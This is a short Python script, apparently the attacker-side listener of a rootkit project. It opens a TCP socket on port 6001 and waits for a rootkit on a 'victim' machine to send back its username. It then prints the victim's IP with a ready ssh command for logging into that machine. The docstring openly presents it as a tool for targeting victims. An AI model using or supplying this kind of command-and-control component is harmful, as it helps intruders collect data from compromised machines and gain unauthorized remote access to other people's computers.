#!/usr/bin/python3

"""
Wanna get the ip of your victim? This is the right script to run 😉
"""

import socket

LOCAL_HOST = "localhost"
PORT = 6001


def get_victim_ip_and_username():

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("", PORT))

        print("Waiting for the rootkit to send victim's data")
        s.listen(5)
        conn, (ip, _) = s.accept()

        with conn:
            username = conn.recv(1024).decode()
            print(f"Obtained victim's data. Use 'ssh {username}@{ip}' to ssh into his machine💪")


if __name__ == '__main__':
    get_victim_ip_and_username()
